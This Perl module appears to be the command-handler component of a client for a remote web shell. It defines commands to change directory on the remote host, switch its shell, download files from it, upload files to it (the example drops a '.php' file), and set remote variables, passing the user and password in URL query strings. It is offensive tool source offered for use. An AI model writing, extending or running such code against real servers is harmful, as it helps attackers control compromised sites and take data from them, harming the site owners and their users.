package handlers;
use strict;
use warnings;

use lib::functions;
use lib::debug::debug;
use lib::comm;

our @ISA = qw(logger base);

sub new {
	my ($class, $shell, $settings) = @_;
	my $self = $class->SUPER::new($settings);
	my $child = {
		shell	=> $shell,
		comm	=> $shell->comm(),
		state 	=> $shell->state(),

		version => 2,
		revision => 1,
	};
	foreach (keys %$child) {
		$self->{$_} = $child->{$_};
	}
	bless $self, $class;
	return $self;
}

sub echo {
	my ($self, $msg) = @_;
	return {payload=>$msg->[0]};
}
sub ping {
	my ($self) = @_;
	$self->log("ping");
	return $self->comm()->sendCommand("PING");
}
sub cd {
	my ($self, $cmd) = @_;
	use Cwd 'abs_path';

	# fix trailing slashes
	if (!defined $self->{state}->get('current_dir')) {
		$self->{state}->set('current_dir', './');
	}

	my $cd = $self->{state}->get('current_dir');

	$self->log("Current dir=`$cd`");

	if ($cd =~ m/[\w]$/) {
		$cd .= "/";
		$self->{state}->set('current_dir', $cd);
	}
	my $param;

	if (!defined $cmd->[0]) {
		$param = $cd;
	}else{
		$param = $cmd->[0];
	}
	
	if ($param =~ m/[\w]$/) {
		$param .= "/";
	}

	my $fullpath;
	if ($param =~ m/^[\w]/) {
		$fullpath = $cd . $param;
	}else{
		$fullpath .= $cd . $param;
	}
	
	$self->log("full path : $fullpath");
	#$param = abs_path($fullpath);

	$cmd->[0] = 'set';
	$param = "current_dir=$fullpath";
	$self->log("Changing directory to $fullpath");
	my @params;
	push(@params, $param);
	my $ret = $self->{comm}->sendInternal($cmd->[0], \@params);
	if ($ret->{status_code} == 200) {
		if ($ret->{current_dir} ne 'false') {
			$self->{state}->set('current_dir', $ret->{current_dir});
		}
	}
	return $ret;
	#undef $self->{result};
}


sub logout {
	my ($cmd) = @_;
	print "loggin out\n";
}

sub shell {
	my ($self, $cmd) = @_;
	# shell [shell]
	$self->log("Switching shell to $cmd->[1]");
	my $ret = $self->{comm}->sendInternal($cmd->[0], $cmd->[1]);
	#if ($ret->{status_code} == 200) {
		$self->{state}->{shell} = $ret->{shell};
	#}
}

sub get {
	my ($self, $cmd) = @_;
	# get file/name.tgz local/path.tgz
	#my @files=split(/ /, $cmd->[1]);
	#$self->{debug}->log("Getting file $files[0] to $files[1]...");
	if (!defined $self->{state}->{current_dir} ||
		!defined $self->{state}->{password}) {
		return 0;
	}
	if (!defined $cmd->[2]) {
		$cmd->[2] = $cmd->[1];
		my @file = split(/\//, $cmd->[2]);
		$cmd->[2] = $file[$#file];
	}

	$cmd->[1] = "?action=INTERNAL&cmd=get&shell=bash&current_dir=$self->{state}->{current_dir}&file=$cmd->[1]&user=$self->{state}->{user}&password=$self->{state}->{password}";
	# url.com/?action=INTERNAL&cmd=get&file=file/name.tgz&password=$
	$self->log($cmd->[1] . " --> " . $cmd->[2]);
	if ($self->{comm}->download($cmd->[1], $cmd->[2])){
		$self->log("Dowload complete!");
	}else{
		$self->log("Failed download!");
	}
}

sub drop {
	my ($self, $cmd) = @_;
	# drop file/name.tgz remotename.php
	if (!defined $self->{state}->{current_dir} ||
		!defined $self->{state}->{password}) {
		return 0;
	}
	if (!defined $cmd->[2]) {
		$cmd->[2] = $cmd->[1];
		my @file = split(/\//, $cmd->[2]);
		$cmd->[2] = $file[$#file];
	}

	$self->log($cmd->[1] . " --> " . $cmd->[2]);
	my $ret = $self->{comm}->upload($cmd->[1], $cmd->[2]);

}

sub set {
	my ($self, $cmd) = @_;
	# set variable=DEADBABE
	$self->log("Setting a variable: $cmd->[1]");
	my $ret = $self->{comm}->sendInternal($cmd->[0], $cmd->[1]);
	if ($ret->{status_code} == 200) {
		my @items = split(/=/, $cmd->[1]);
		$self->{state}->{$items[0]} = $items[1];
	}
}

sub unset {
	my ($self, $cmd) = @_;
	# unset variable
	$self->log("Unetting a variable: $cmd->[1]");
	my $ret = $self->{comm}->sendInternal($cmd->[0], $cmd->[1]);
	if ($ret->{status_code} == 200) {
		undef $self->{state}->{$cmd->[1]};
	}
}

# Getters and setters
sub comm {
	my $self = shift;
	return $self->{comm};
}
1;
